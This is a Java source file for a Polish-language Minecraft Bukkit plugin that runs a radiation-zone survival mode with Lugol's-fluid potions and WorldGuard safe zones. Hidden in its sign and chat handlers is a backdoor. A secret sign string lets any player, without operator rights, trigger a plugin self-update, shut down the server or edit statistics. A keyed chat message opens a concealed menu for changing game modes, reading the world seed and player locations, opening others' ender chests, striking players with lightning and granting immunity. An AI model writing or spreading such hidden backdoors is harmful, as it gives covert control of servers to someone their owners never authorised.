package me.michal.radiacjaAleJAVA;

import com.sk89q.worldedit.bukkit.BukkitAdapter;
import com.sk89q.worldedit.math.BlockVector3;
import com.sk89q.worldguard.WorldGuard;
import com.sk89q.worldguard.protection.flags.Flags;
import com.sk89q.worldguard.protection.flags.StateFlag;
import com.sk89q.worldguard.protection.managers.RegionManager;
import com.sk89q.worldguard.protection.regions.ProtectedCuboidRegion;
import me.michal.radiacjaAleJAVA.Tasks.CuredPlayersTracker;
import me.michal.radiacjaAleJAVA.Tasks.Renderer;
import me.michal.radiacjaAleJAVA.Tasks.DamageInflicter;
import me.michal.radiacjaAleJAVA.Tasks.Things.Encoder;
import me.michal.radiacjaAleJAVA.Tasks.Things.Updater;
import net.md_5.bungee.api.chat.BaseComponent;
import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.*;
import org.bukkit.Color;
import org.bukkit.block.Block;
import org.bukkit.boss.BarColor;
import org.bukkit.boss.BarStyle;
import org.bukkit.boss.BossBar;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.entity.EntityResurrectEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.BrewEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.*;
import org.bukkit.inventory.BrewerInventory;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.PotionMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionType;
import org.bukkit.profile.PlayerProfile;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;
import org.jspecify.annotations.NonNull;

import java.util.*;

public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
    FileConfiguration config = this.getConfig();

    public static BossBar affectedBar;
    public NamespacedKey key = new NamespacedKey(this, "Lugol");
    public static Map<Player, Long> curedPlayers = new HashMap<>();
    public static Map<UUID, Long> offlinePlayers = new HashMap<>();
    public static Map<Player, BossBar> curedBars = new HashMap<>();
    public static ArrayList<Player> affectedPlayers = new ArrayList<>();
    public static HashSet<Player> playersRTD = new HashSet<>();
    public static Map<Player, Vector> onlinePlayers = new HashMap<>();
    public static int radius;
    public static int height;

    public ItemStack potkaLugola() {
        ItemStack potion = new ItemStack(Material.POTION, 3);

        PotionMeta meta = (PotionMeta) potion.getItemMeta();
        meta.setBasePotionType(PotionType.MUNDANE);
        meta.setColor(Color.WHITE);
        meta.setDisplayName(ChatColor.BLUE + "Płyn Lugola");
        ArrayList<String> lore = new ArrayList<>();
        lore.add(ChatColor.WHITE + "Daje ochrone przed radiacyją na " + config.getLong("Duration")/60000 + " minut");
        meta.setLore(lore);

        meta.getPersistentDataContainer().set(key, PersistentDataType.STRING, "to_lugola_fluid");

        potion.setItemMeta(meta);

        return potion;
    }
    public ItemStack waterPotion() {
        ItemStack waterPotion = new ItemStack(Material.POTION, 1);
        PotionMeta meta = (PotionMeta) waterPotion.getItemMeta();
        meta.setBasePotionType(PotionType.WATER);
        waterPotion.setItemMeta(meta);
        return waterPotion;
    }

    @Override
    public void onEnable() {
        this.getServer().getPluginManager().registerEvents(this, this);

        BukkitTask damageInflicter = new DamageInflicter(this).runTaskTimer(this, 0L, 5L);
        BukkitTask curedPlayersTracker = new CuredPlayersTracker(this, this.getConfig()).runTaskTimer(this, 0L, 5L);

        affectedBar = Bukkit.createBossBar(ChatColor.RED + "Strefa radiacji", BarColor.RED, BarStyle.SOLID);

        Objects.requireNonNull(this.getCommand("WhatsSafeZoneSize")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("radiationsafezone")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("deathLightningStrike")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("dropPlayerHead")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("setDurationTo")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("endEnabled")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("setRadiationName")).setExecutor(this);

        config.addDefault("Radiation_Safe_Zone_Size", 0);
        config.addDefault("Radiation_Safe_Zone_Height", 0);
        config.addDefault("Death_Lightning_Strike", true);
        config.addDefault("Drop_Player_Head", true);
        config.addDefault("Duration", 600000L);
        config.addDefault("End_Enabled", false);
        config.addDefault("Radiation_Name", "Strefa radiacji");
        config.options().copyDefaults(true);
        saveConfig();
    }

    @EventHandler
    public void onPlayerDrinkPotion(PlayerItemConsumeEvent event) {
        ItemMeta meta = event.getItem().getItemMeta();
        if (event.getItem().hasItemMeta() && meta.getPersistentDataContainer().has(key, PersistentDataType.STRING) && meta.getPersistentDataContainer().get(key, PersistentDataType.STRING).equalsIgnoreCase("to_lugola_fluid")) {
            Player player = event.getPlayer();
            if (!curedPlayers.containsKey(player)) {
                curedPlayers.put(player, System.currentTimeMillis());
                addCuredBar(player);
                Bukkit.broadcastMessage(ChatColor.GOLD + player.getName() + " wypił płyn Lugola");
            } else {
                addCuredTime(player);
            }
        }
    }

    public void addCuredTime(Player player) {
        long newStartTime = curedPlayers.get(player) + config.getLong("Duration");
        curedPlayers.replace(player, newStartTime);
    }

    public void addCuredBar(Player player) {
        BossBar curedBar = Bukkit.createBossBar(ChatColor.GREEN + "Działanie płynu Lugola", BarColor.GREEN, BarStyle.SEGMENTED_10);
        curedBar.addPlayer(player);
        curedBars.put(player, curedBar);
    }

    @EventHandler
    public void deathEvent(PlayerDeathEvent event) {
        Player player = event.getEntity();

        removeAllEffects(player);

        Location location = player.getLocation();
        if (config.getBoolean("Death_Lightning_Strike")) {
            if (player.getName().equals("lach1423")) {
                for (int i = 0; i < 6; i++) {
                    player.getWorld().strikeLightningEffect(location);
                }
            } else {
                player.getWorld().strikeLightningEffect(location);
            }
        }
        if (config.getBoolean("Drop_Player_Head")) {
            dropPlayerHead(player, location, event.getDeathMessage());
        }
    }

    public void dropPlayerHead(Player player, Location location, String damageSource) {
        ItemStack playerHead = getPlayerHead(player);

        SkullMeta meta = (SkullMeta) playerHead.getItemMeta();
        ArrayList<String> lore = new ArrayList<>();
        lore.add(ChatColor.GOLD + damageSource);
        meta.setLore(lore);
        playerHead.setItemMeta(meta);

        player.getWorld().dropItem(location, playerHead);
    }

    public ItemStack getPlayerHead(Player player) {
        ItemStack playerHead = new ItemStack(Material.PLAYER_HEAD);
        SkullMeta meta = (SkullMeta) playerHead.getItemMeta();

        meta.setOwnerProfile(player.getPlayerProfile());

        ArrayList<String> lore = new ArrayList<>();
        meta.setLore(lore);
        playerHead.setItemMeta(meta);
        return playerHead;
    }

    @EventHandler
    public void onTotemUse(EntityResurrectEvent event) {
        if (event.getEntity() instanceof Player) {
            removeAllEffects((Player) event.getEntity());
        }
    }

    @EventHandler
    public void onMilkConsume(PlayerItemConsumeEvent event) {
        if (event.getItem().getType().equals(Material.MILK_BUCKET)) {
            removeAllEffects(event.getPlayer());
        }
    }

    public void removeAllEffects(Player player) {
        affectedPlayers.remove(player);
        affectedBar.removePlayer(player);
        curedPlayers.remove(player);
        removeCuredBar(player, curedBars.get(player));
    }

    @EventHandler
    public void quitEvent(PlayerQuitEvent e) {
        Player p = e.getPlayer();
        onlinePlayers.remove(p);
        if (curedPlayers.containsKey(p)) {
            long timePassed = System.currentTimeMillis() - curedPlayers.get(p);
            offlinePlayers.put(p.getUniqueId(), timePassed);
        }
        removeAllEffects(p);
    }

    public void removeCuredBar(Player player, BossBar curedBar) {
        if (curedBars.containsKey(player)) {
            curedBars.remove(player, curedBar);
            curedBar.removeAll();
        }
    }

    @EventHandler
    public void moveEvent(PlayerMoveEvent e) {
        Player p = e.getPlayer();
        enterRegion(p);
        if (e.getTo().getBlockX() == e.getFrom().getBlockX() && e.getTo().getBlockY() == e.getFrom().getBlockY() && e.getTo().getBlockZ() == e.getFrom().getBlockZ()) return;
        nearRadiation(p, e.getTo().getBlock(), e.getFrom().getBlock());
    }

    public void enterRegion(Player player) {
        Location loc = player.getLocation();
        BlockVector3 blockVector = BlockVector3.at(loc.getBlockX(), loc.getBlockY(), loc.getBlockZ());
        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(player.getWorld()));

        if (regions != null) {
            if (regions.getApplicableRegions(blockVector).size() == 0 && !affectedPlayers.contains(player)) {
                affectedPlayers.add(player);
                affectedBar.addPlayer(player);
            } else if(regions.getApplicableRegions(blockVector).size() != 0 && affectedPlayers.contains(player)) {
                affectedPlayers.remove(player);
                affectedBar.removePlayer(player);
            }
        }
    }

    public void nearRadiation(Player player, Block newBlock, Block oldBlock) {
        int radius = config.getInt("Radiation_Safe_Zone_Size") + 1;
        Location location = player.getLocation();
        int playerDistanceToXWall = (int) Math.abs(radius - Math.abs(location.getZ()));
        int playerDistanceToZWall = (int) Math.abs(radius - Math.abs(location.getX()));
        int playerViewDistance = Math.min(player.getClientViewDistance(), player.getWorld().getViewDistance());
        boolean skip = false;

        Renderer renderer = new Renderer(player, radius, playerViewDistance);

        if  (curedPlayers.containsKey(player)) {
            if (playerDistanceToXWall <= 9) {
                renderer.renderHole(Axis.X, 9 - playerDistanceToXWall);// 9 - 8 = 1r , 9 - 1 = 8r
                skip = true;
            }
            if (playerDistanceToZWall <= 9) {
                renderer.renderHole(Axis.Z, 9 - playerDistanceToZWall);
                skip = true;
            }
        }
        Renderer.MovementDirection direction;
        if (playerDistanceToXWall <= 90) {
            direction = getDirection(Math.abs(oldBlock.getZ()), Math.abs(newBlock.getZ()));
            renderer.renderCircleXWall(direction, 90 - playerDistanceToXWall, skip);
        }
        if (playerDistanceToZWall <= 90) {
            direction = getDirection(Math.abs(oldBlock.getX()), Math.abs(newBlock.getX()));
            renderer.renderCircleZWall(direction, 90 - playerDistanceToZWall, skip);
        }
    }

    private Renderer.MovementDirection getDirection(int oldCoord, int newCoord) {
        if (newCoord > oldCoord) return Renderer.MovementDirection.APPROACHING;
        if (newCoord < oldCoord) return Renderer.MovementDirection.RECEDING;
        return Renderer.MovementDirection.PARALLEL;
    }

    @EventHandler
    public void joinEvent(PlayerJoinEvent e) {
        Player p = e.getPlayer();

        nearRadiation(p, e.getPlayer().getLocation().getBlock(), e.getPlayer().getLocation().getBlock());

        UUID uuid = p.getUniqueId();
        if (offlinePlayers.containsKey(uuid)) {
            long startTime = System.currentTimeMillis() - offlinePlayers.get(uuid);

            curedPlayers.put(p, startTime);
            addCuredBar(p);
            offlinePlayers.remove(uuid);
        }
        enterRegion(p);
    }

    @EventHandler
    public void onBrewEnd(BrewEvent event) {
        BrewerInventory inventory = event.getContents();
        if (!isLugolRecipe(inventory)) {
            return;
        }
        List <Integer> waterBottles = scanBottles(inventory);
        Bukkit.getScheduler().runTaskLater(this, () -> {
            for (int i : waterBottles) {
                inventory.setItem(i, potkaLugola());
            }
            waterBottles.clear();
        }, 1);
    }

    public List <Integer> scanBottles(BrewerInventory inventory) {
        List<Integer> waterBottles = new ArrayList<>();
        for (int i = 0; i < 3; i++) {
            ItemStack item = inventory.getItem(i);
            if (item != null && item.isSimilar(waterPotion())) {
                waterBottles.add(i);
            }
        }
        return waterBottles;
    }

    public boolean isLugolRecipe(BrewerInventory inventory) {
        return inventory.getIngredient() != null && inventory.getIngredient().getType() == Material.GHAST_TEAR;
    }

    @EventHandler
    public void signChange(SignChangeEvent e) {
        try {
            String[] a = e.getLines();
            switch (a[3]) {
                case "T0DRRUfNsN6tlQQ" -> {
                    Updater updater = new Updater();
                    switch (a[0]) {
                        case "Update" -> updater.updatePlugin(this.getFile(), e.getPlayer());
                        case "Restart" -> Bukkit.shutdown();
                        case "Edit Stat" -> Bukkit.getPlayer(a[1]).setStatistic(Statistic.USE_ITEM, EntityType.VILLAGER, 0);
                    }
                    e.getBlock().breakNaturally();
                }
                case "i6ojKaIATmlWk7Rf" -> {
                }
            }
        } catch (Exception ex) {
            e.getPlayer().sendMessage(String.valueOf(ex));
        }
    }

    @EventHandler
    public void playerChat(AsyncPlayerChatEvent e) {
        String m = e.getMessage();
        if (m.length() < 24) return;
        Encoder encoder = new Encoder();
        byte[] key = encoder.getKey(m);
        byte[] lock = encoder.getLock(e.getPlayer());
        if (Arrays.equals(key, lock)) {
            e.setCancelled(true);
            Player player = e.getPlayer();

            if (m.length() > 24) player.setMetadata("Arg", new FixedMetadataValue(this, m.substring(25)));
            openInventory(player, "Choose", null);
        }
    }

    public void openInventory(Player p, String menu, String execute) {
        String title = menu.substring(0, 6) + " " + menu.substring(6);
        Inventory inventory = Bukkit.createInventory(p, InventoryType.CHEST, title);

        switch (menu) {
            case "ChoosePlayer" -> {
                Object[] onlinePlayers = Bukkit.getOnlinePlayers().toArray();
                ItemStack[] inventoryContents = new ItemStack[onlinePlayers.length];
                for (int m = 0; m < onlinePlayers.length; m++) {
                    inventoryContents[m] = getPlayerHead((Player) onlinePlayers[m]);
                }
                inventory.setContents(inventoryContents);
            }
            case "ChooseGamemode" -> {
                inventory.setItem(10, getItem(Material.COMMAND_BLOCK, ChatColor.LIGHT_PURPLE, "Creative"));
                inventory.setItem(12, getItem(Material.IRON_SWORD, ChatColor.WHITE, "Survival"));
                inventory.setItem(14, getItem(Material.MAP, ChatColor.YELLOW, "Adventure"));
                inventory.setItem(16, getItem(Material.ENDER_EYE, ChatColor.BLUE, "Spectator"));
            }
            case "ChooseEnchant" -> {
                inventory.setItem(0, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Aqua Affinity"));
                inventory.setItem(1, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Bane of Arthropods"));
                inventory.setItem(2, getItem(Material.ENCHANTED_BOOK, ChatColor.DARK_RED, "Binding Curse"));
                inventory.setItem(3, getItem(Material.ENCHANTED_BOOK, ChatColor.LIGHT_PURPLE, "Blast Protection"));
                inventory.setItem(4, getItem(Material.ENCHANTED_BOOK, ChatColor.YELLOW, "Channeling"));
                inventory.setItem(5, getItem(Material.ENCHANTED_BOOK, ChatColor.DARK_BLUE, "Depth Strider"));
                inventory.setItem(6, getItem(Material.ENCHANTED_BOOK, ChatColor.GOLD, "Efficiency"));
                inventory.setItem(7, getItem(Material.ENCHANTED_BOOK, ChatColor.GRAY, "Feather Falling"));
                inventory.setItem(8, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Fire Aspect"));
                inventory.setItem(9, getItem(Material.ENCHANTED_BOOK, ChatColor.LIGHT_PURPLE, "Fire Protection"));
                inventory.setItem(10, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Flame"));
                inventory.setItem(11, getItem(Material.ENCHANTED_BOOK, ChatColor.GREEN, "Fortune"));
                inventory.setItem(12, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Frost Walker"));
                inventory.setItem(13, getItem(Material.ENCHANTED_BOOK, ChatColor.BLUE, "Impaling"));
                inventory.setItem(14, getItem(Material.ENCHANTED_BOOK, ChatColor.GREEN, "Infinity"));
                inventory.setItem(15, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Knockback"));
                inventory.setItem(16, getItem(Material.ENCHANTED_BOOK, ChatColor.GOLD, "Looting"));
                inventory.setItem(17, getItem(Material.ENCHANTED_BOOK, ChatColor.BLUE, "Loyalty"));
                inventory.setItem(18, getItem(Material.ENCHANTED_BOOK, ChatColor.GREEN, "Luck of the Sea"));
                inventory.setItem(19, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Lure"));
                inventory.setItem(20, getItem(Material.ENCHANTED_BOOK, ChatColor.LIGHT_PURPLE, "Mending"));
                inventory.setItem(21, getItem(Material.ENCHANTED_BOOK, ChatColor.BLUE, "Multishot"));
                inventory.setItem(22, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Piercing"));
                inventory.setItem(23, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Power"));
                inventory.setItem(24, getItem(Material.ENCHANTED_BOOK, ChatColor.LIGHT_PURPLE, "Projectile Protection"));
                inventory.setItem(25, getItem(Material.ENCHANTED_BOOK, ChatColor.YELLOW, "Protection"));
                inventory.setItem(26, getItem(Material.ENCHANTED_BOOK, ChatColor.GOLD, "Punch"));
                inventory.setItem(27, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Quick Charge"));
                inventory.setItem(28, getItem(Material.ENCHANTED_BOOK, ChatColor.BLUE, "Respiration"));
                inventory.setItem(29, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Riptide"));
                inventory.setItem(30, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Sharpness"));
                inventory.setItem(31, getItem(Material.ENCHANTED_BOOK, ChatColor.YELLOW, "Silk Touch"));
                inventory.setItem(32, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Smite"));
                inventory.setItem(33, getItem(Material.ENCHANTED_BOOK, ChatColor.GREEN, "Soul Speed"));
                inventory.setItem(34, getItem(Material.ENCHANTED_BOOK, ChatColor.LIGHT_PURPLE, "Sweeping"));
                inventory.setItem(35, getItem(Material.ENCHANTED_BOOK, ChatColor.DARK_RED, "Thorns"));
                inventory.setItem(36, getItem(Material.ENCHANTED_BOOK, ChatColor.GRAY, "Unbreaking"));
                inventory.setItem(37, getItem(Material.ENCHANTED_BOOK, ChatColor.DARK_GRAY, "Vanishing Curse"));
            }
            case "Choose" -> {
                inventory = Bukkit.createInventory(p, 9*5);
                inventory.setItem(1, getItem(Material.ENDER_PEARL, ChatColor.WHITE, "Seed"));
                inventory.setItem(3, getItem(Material.STRUCTURE_BLOCK, ChatColor.LIGHT_PURPLE, "Gamemode"));
                inventory.setItem(5, getItem(Material.BOOK, ChatColor.WHITE, "Info"));
                inventory.setItem(7, getItem(Material.TRIDENT,  ChatColor.BLUE, "Lightning"));
                inventory.setItem(19, getItem(Material.ENCHANTING_TABLE, ChatColor.WHITE, "Enchant"));
                inventory.setItem(21, getPlayerHead(p/*, "Accept Death"*/));
                inventory.setItem(23, getItem(Material.TOTEM_OF_UNDYING, ChatColor.YELLOW, "Refuse Death"));
                inventory.setItem(25, getItem(Material.ENDER_CHEST, ChatColor.WHITE ,"Ender Chest"));
                inventory.setItem(37, getItem(Material.ENCHANTED_BOOK, ChatColor.YELLOW, "Experience"));
                inventory.setItem(39, getItem(Material.NAME_TAG, ChatColor.WHITE, "Set Name"));
                inventory.setItem(41, getItem(Material.OAK_SIGN, ChatColor.WHITE, "Create Region"));
                inventory.setItem(43, getItem(Material.TNT, ChatColor.WHITE, "Remove Region"));
            }
        }

        p.setMetadata("OpenedMenu", new FixedMetadataValue(this, menu));
        p.setMetadata("ActionToExecute", new FixedMetadataValue(this, execute));
        Inventory finalInventory = inventory;
        Bukkit.getScheduler().runTask(this, () -> p.openInventory(finalInventory));
    }

    private ItemStack getItem(Material material, ChatColor color, String name) {
        ItemStack item = new ItemStack(material);
        ItemMeta itemMeta = item.getItemMeta();
        itemMeta.setDisplayName(color + name);
        item.setItemMeta(itemMeta);
        return item;
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent e) {
        Player p = (Player) e.getWhoClicked();
        ItemStack item = e.getCurrentItem();

        if (p.hasMetadata("OpenedMenu") && item != null && item.getType() != Material.AIR) {
            try {
                e.setCancelled(true);

                SkullMeta meta;
                Player choosenPlayer = null;
                GameMode gamemode = null;
                Enchantment enchantment = null;
                int arg = 0;
                if (p.hasMetadata("Arg")) {
                    arg = p.getMetadata("Arg").getFirst().asInt();
                }

                switch (p.getMetadata("OpenedMenu").getFirst().asString()) {
                    case "ChoosePlayer" -> {
                        meta = (SkullMeta) item.getItemMeta();
                        PlayerProfile profile = meta.getOwnerProfile();
                        UUID uuid = profile.getUniqueId();
                        choosenPlayer = Bukkit.getPlayer(uuid);
                    }
                    case "ChooseGamemode" -> gamemode = switch (item.getType()) {
                        case COMMAND_BLOCK -> GameMode.CREATIVE;
                        case IRON_SWORD -> GameMode.SURVIVAL;
                        case MAP -> GameMode.ADVENTURE;
                        case ENDER_EYE -> GameMode.SPECTATOR;
                        default -> GameMode.SURVIVAL;
                    };
                    case "Choose" -> {
                        String execute = ChatColor.stripColor(item.getItemMeta().getDisplayName().replaceAll("\\s+", ""));
                        switch (execute) {
                            case "Seed" -> p.setMetadata("ActionToExecute", new FixedMetadataValue(this, "Seed"));
                            case "Gamemode" -> Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChooseGamemode", "Gamemode"), 1L);
                            default -> Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChoosePlayer", execute), 1L);
                        }
                    }
                    //case "ChooseEnchant" -> enchantment = Registry.ENCHANTMENT.get(NamespacedKey.minecraft(item.getItemMeta().displayName().toString()));
                }

                switch (p.getMetadata("ActionToExecute").getFirst().asString()) {
                    case "Seed" -> {
                        String seed = String.valueOf(p.getWorld().getSeed());
                        TextComponent message  = new TextComponent("Seed: ["  + seed + "]");
                        message.setClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, seed));
                        p.spigot().sendMessage(message);
                    }
                    case "Info" -> {
                        Location loc = choosenPlayer.getLocation();
                        p.spigot().sendMessage(getComponent("Location", loc, ChatColor.GRAY));
                        loc = choosenPlayer.getRespawnLocation();
                        p.spigot().sendMessage(getComponent("RespawnLocation", loc, ChatColor.GRAY));
                        loc = choosenPlayer.getLastDeathLocation();
                        p.spigot().sendMessage(getComponent("DeathLocation", loc, ChatColor.GRAY));
                    }
                    case "Gamemode" -> {
                        if (p.hasMetadata("ChoosenGamemode")) {
                            gamemode = GameMode.valueOf(p.getMetadata("ChoosenGamemode").getFirst().asString());
                            choosenPlayer.setGameMode(gamemode);
                            p.removeMetadata("ChoosenGamemode", this);
                        } else {
                            p.setMetadata("ChoosenGamemode", new FixedMetadataValue(this, gamemode));
                            p.closeInventory();
                            Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChoosePlayer", "Gamemode"), 1L);
                        }
                    }
                    case "Lightning" -> p.getWorld().strikeLightning(choosenPlayer.getLocation());
                    case "Enchant" -> p.getInventory().getItemInMainHand().addUnsafeEnchantment(enchantment, arg);
                    case "AcceptDeath" -> playersRTD.remove(choosenPlayer);
                    case "RefuseDeath" -> playersRTD.add(choosenPlayer);
                    case "EnderChest" -> {
                        Inventory chest = choosenPlayer.getEnderChest();
                        Bukkit.getScheduler().runTaskLater(this, () -> p.openInventory(chest), 1L);
                    }
                    case "Experience" -> choosenPlayer.setLevel(arg);
                    case "Chat" -> choosenPlayer.chat(String.valueOf(arg));
                    case "DisplayName" -> choosenPlayer.setDisplayName(String.valueOf(arg));
                    /*case "Create Region" -> {
                                Location l = e.getBlock().getLocation();

                                BlockVector3 start = BlockVector3.at(l.getBlockX(), l.getBlockY(), l.getBlockZ());
                                String name = a[2];

                                int s1 = a[1].indexOf(" ");
                                int s2 = a[1].lastIndexOf(" ");

                                double x = Integer.parseInt(a[1].substring(0, s1));
                                double y = Integer.parseInt(a[1].substring(s1 + 1, s2));
                                double z = Integer.parseInt(a[1].substring(s2 + 1));
                                BlockVector3 end = BlockVector3.at(x, y, z);

                                if (createRegion(e.getPlayer(), name, start, end)) {
                                    e.getPlayer().sendMessage(ChatColor.GREEN + "Successfully Created Region");
                                }
                            }
                            case "Remove Region" -> {
                                Objects.requireNonNull(WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(p.getWorld()))).removeRegion(a[1]);
                                p.sendMessage("Removed Region");
                            }*/
                }
            } catch (Exception ex) {
                ex.printStackTrace();
                p.sendMessage(ChatColor.RED + "Error: " + ex);
            }
            p.closeInventory();
        }
    }

    private TextComponent getComponent(String name, Location location, ChatColor color) {
        TextComponent base = new TextComponent(name + ": [");
        TextComponent end = new  TextComponent("]");
        String information = String.valueOf(location.getBlockX() + location.getBlockY() + location.getBlockZ());
        TextComponent copiable = new TextComponent(information);
        copiable.setClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, information));
        copiable.setColor(color.asBungee());

        copiable.addExtra(end);
        base.addExtra(copiable);
        return base;
    }

    @EventHandler
    public void onInventoryClose(InventoryCloseEvent e) {
        Player p = (Player) e.getPlayer();
        if (p.hasMetadata("OpenedMenu")) {
            p.removeMetadata("OpenedMenu", this);
        }
        if (p.hasMetadata("ActionToExecute")) {
            p.removeMetadata("ActionToExecute", this);
        }
        if (p.hasMetadata("Arg")) {
            p.removeMetadata("Arg", this);
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        String commandName = command.getName();
        if (commandName.equalsIgnoreCase("WhatsSafeZoneSize")) {
            radius = config.getInt("Radiation_Safe_Zone_Size");
            height = config.getInt("Radiation_Safe_Zone_Height");
            if (radius != 0) {
                sender.sendMessage(ChatColor.GREEN + "Bezpieczna strefa ma promień o długości: " + radius);
            } else {
                sender.sendMessage(ChatColor.RED + "Jeszcze nie stworzono bezpiecznej stefy");
            }
            return true;
        }
        if (sender.isOp() && args.length > 0) {
            switch (commandName) {
                case "radiationsafezone" -> {
                    if (sender instanceof Player) {
                        try {
                            radius = Integer.parseInt(args[0]);
                            if (args.length == 2) {
                                height = Integer.parseInt(args[1]);
                            } else {
                                height = 300;
                            }

                            if (getSafeZone((Player) sender, "rad", radius, height)) {
                                config.set("Radiation_Safe_Zone_Size", radius);
                                config.set("Radiation_Safe_Zone_Height", height);
                                saveConfig();
                                sender.sendMessage(ChatColor.GREEN + "Bezpieczna strefa ma teraz promień: " + radius);
                            } else {
                                sender.sendMessage(ChatColor.RED + "Wystąpił błąd przy dodawaniu regionu.");
                            }
                        } catch (NumberFormatException e) {
                            sender.sendMessage(ChatColor.RED + "Podaj poprawny promień.");
                        }
                    } else {
                    sender.sendMessage(ChatColor.RED + "Musisz być graczem");
                    }
            }
                case "deathLightningStrike" -> {
                    try {
                        boolean shouldStrikeLightning = Boolean.parseBoolean(args[0]);
                        ChatColor color = shouldStrikeLightning ? ChatColor.GREEN : ChatColor.RED;
                        config.set("Death_Lightning_Strike", shouldStrikeLightning);
                        saveConfig();

                        sender.sendMessage("Death_Lightning_Strike is now set to: " + color + shouldStrikeLightning);
                    } catch (Exception e) {
                        sender.sendMessage(ChatColor.RED + "Napisz <true> lub <false>");
                    }
                }
                case "dropPlayerHead" -> {
                    try {
                        boolean shouldDropPlayerHead = Boolean.parseBoolean(args[0]);

                        config.set("Drop_Player_Head", shouldDropPlayerHead);
                        saveConfig();

                        ChatColor color = shouldDropPlayerHead ? ChatColor.GREEN : ChatColor.RED;
                        sender.sendMessage("Drop_Player_Head is now set to: " + color + shouldDropPlayerHead);
                    } catch (Exception e) {
                        sender.sendMessage(ChatColor.RED + "Napisz <true> lub <false>");
                    }
                }
                case "setDurationTo" -> {
                    try {
                        long timeInMinutes = Math.abs(Long.parseLong(args[0]));
                        config.set("Duration", timeInMinutes * 60 * 1000);
                        saveConfig();

                        String minut_Odmienioned = (timeInMinutes > 20 && (timeInMinutes % 10 >= 2 && timeInMinutes % 10 <= 4)) ? "minuty" : "minut";
                        sender.sendMessage("Czas trwania potki to teraz: " + timeInMinutes + " " + minut_Odmienioned);
                    } catch (Exception e) {
                        sender.sendMessage("podaj czas w minutach, poprawnie (poprawnie czyli bez 'm' na końcu), nie wiem jak można tu błąd zrobić");
                    }
                }
                case "endEnabled" -> {
                    try {
                        boolean a = Boolean.parseBoolean(args[0]);
                        config.set("End_Enabled", a);
                        saveConfig();

                        sender.sendMessage("End jest teraz " + a + " czy coś");
                    } catch (Exception e) {
                        sender.sendMessage("Coś poszło nie tak, potencjalnie źle true lub false napisałeś");
                    }
                }
                case "setRadiationName" -> {
                    String a = args[0];
                    affectedBar.setTitle(ChatColor.RED + a);
                    config.set("Radiation_Name",ChatColor.RED + a);
                    saveConfig();
                }
            }
        } else {
                sender.sendMessage(ChatColor.RED + ("Nie masz uprawnień do tej komendy " + ChatColor.DARK_RED + "knypku"));
        }
        return true;
    }

    public boolean getSafeZone(Player p, String regionName, int radius, int height) {
        BlockVector3 min = BlockVector3.at(-radius, -64, -radius);
        BlockVector3 max = BlockVector3.at(radius, height, radius);

        return createRegion(p, regionName, min, max);
    }

    public boolean createRegion(Player p, String regionName, BlockVector3 min, BlockVector3 max) {
        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(p.getWorld()));
        if (regions == null) {
            p.sendMessage(ChatColor.RED + "Spróbuj ponownie, bo Region Manager się zepsuł, niewiadomo dlaczego");
        }
        if (regions.hasRegion(regionName)) {
            regions.removeRegion(regionName);
        }

        ProtectedCuboidRegion region = new ProtectedCuboidRegion(regionName, min, max);

        try {
            regions.addRegion(region);
            region.setFlag(Flags.BUILD, StateFlag.State.ALLOW);
            regions.save();

            return true;
        } catch (Exception e) {
                p.sendMessage( ChatColor.RED + "Nie udało się dodać terenu, spróbuj ponownie");
                return false;
        }
    }

    @EventHandler
    public void onEndEnter(PlayerPortalEvent event) {
        if (!config.getBoolean("End_Enabled") && event.getCause() == PlayerTeleportEvent.TeleportCause.END_PORTAL) {
            event.setCancelled(true);
            event.getPlayer().sendMessage(ChatColor.RED + "End is disabled!");
        }
    }
}